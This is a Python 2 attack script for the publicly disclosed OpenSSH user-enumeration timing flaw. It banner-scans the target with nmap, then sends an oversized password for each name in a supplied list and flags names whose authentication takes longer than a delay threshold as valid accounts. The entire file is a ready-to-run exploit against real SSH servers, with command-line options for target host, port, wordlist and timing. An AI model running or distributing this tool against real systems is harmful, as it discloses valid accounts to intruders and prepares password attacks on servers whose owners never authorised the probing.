#!/usr/bin/python
# -*- coding: utf-8 -*-

import paramiko
import socket
import time
import os,sys
import argparse
import subprocess
from IPy import IP
from threading import *
screenLock = Semaphore(value=1)

def sshTime(host,port,user,sock,defTime):
    print 'Connecting %s@%s:%d ' % (user,host,int(port))

    try:
        sock.connect((host,int(port)))
        para = paramiko.Transport(sock)
        para.local_version="SSH-2.0-Blabla"

    except paramiko.SSHException: 
        print "Unable to connect to host"
        exit(1)   
    
    try:
        para.connect(username=user)

    except EOFError,e:
        print 'Error: %s' % e
        exit(1)   

    except paramiko.SSHException,e:
        print 'Error: %s' % e
        exit(1)   

    #results in a long wait on sshd side, as it needs to calc the password
    #only if the user exists
    passwd = 'A'*39000

    #time measurement
    timeStart = int(time.time())

    try:
         para.auth_password(user,passwd)
    except paramiko.AuthenticationException,e:
         print e
    except paramiko.SSHException,e:
         print e

    timeDone = int(time.time())

    #simple time calculation
    timeRes = timeDone-timeStart

    if timeRes > defTime:
        print 'User: %s exists' % user
        ret = user,host,port,timeRes

    else:
        ret = -1
    para.close()
    return ret

def sshBanner(host,port):

    nport="-p"+port
    print "Scaning %s tcp port at %s ..." % (port,host)
    try:
        scanv = subprocess.Popen(["nmap", "-PN", "-sV", nport,host],stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
    except OSError:
        print "Install nmap: sudo apt-get install nmap"  

    scanlist=scanv.split()
    if 'filtered' in scanlist:
	print "Port " + port + " is filtered." 
	print "Nothing to do."
	exit(1)
  
    elif 'closed' in scanlist:
	print "Port " + port + " is close." 
	print "Nothing to do."
	exit(1)

    else: 
	print "Port " + port + " is open." 
	if 'ssh' in scanlist:
		index = scanlist.index('ssh')
    		print "SSH Server Banner ==> %s %s" % (scanlist[index+1], scanlist[index+2])
        	banner = scanlist[index+1] + " " + scanlist[index+2]
	else:
		print "Are you sure that it's a ssh server?"
		print "Check with \"nmap -PN -sV -p 22 \" if you see something strange."
		exit(1)
   
    return banner	

def main():
 
    parse = argparse.ArgumentParser(description='OpenSSH User Enumeration Time-Based Attack')
    parse.add_argument('-H', action='store', dest='host', help='Host to attack')
    parse.add_argument('-p', action='store', dest='port', help='Host port')
    parse.add_argument('-L', action='store', dest='ufile', help='User list file')
    parse.add_argument('-d', action='store', dest='delay', help='Time delay in seconds')

    argus=parse.parse_args()

    if argus.host == None:
        parse.print_help()
        exit
    elif argus.port == None:
        parse.print_help()
        exit
    elif argus.ufile == None:
        parse.print_help()
        exit
    elif argus.delay == None:
        parse.print_help()
        exit
    else:
        host = argus.host
        port = argus.port
        defTime = int(argus.delay)
        try:
            IP(host)
        except ValueError:
            print "Invalid host address."
            exit(1)
        try:
            userFile = open (argus.ufile,'r')
        except IOError:
            print "The file %s doesn't exist." % (argus.ufile)
            exit(1)




        foundUser = []
        print """
        ********************************************************************
        *      	OpenSSH User Enumeration Timing Attack                 *
        *                                                                  *
        *  http://cureblog.de/openssh-user-enumeration-time-based-attack/  *
        *  http://seclists.org/fulldisclosure/2013/Jul/88                  *
        *                                                                  *
        ********************************************************************
        """ 
        print
        banner = sshBanner(host,port)
        print            
        for line in userFile.readlines():
            line = line.split("\n")
            user = line[0]
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            fUser = sshTime(host,port,user,sock,defTime)
            if fUser != -1 and fUser !=None:
                 foundUser.append(fUser)
            sock.close()
        if len(foundUser) == 0:
		print "No users found. " + banner + " perhaps it's not vulnerable."
        else:	 
            print
            print "Server version: " + banner
            print
            print "Users found      Time delay in seconds"
            print "--------------------------------------"
            for entry in foundUser:
                if entry != -1:
                    print entry[0] + "                      " + str(entry[3])

if __name__=="__main__":
    main()

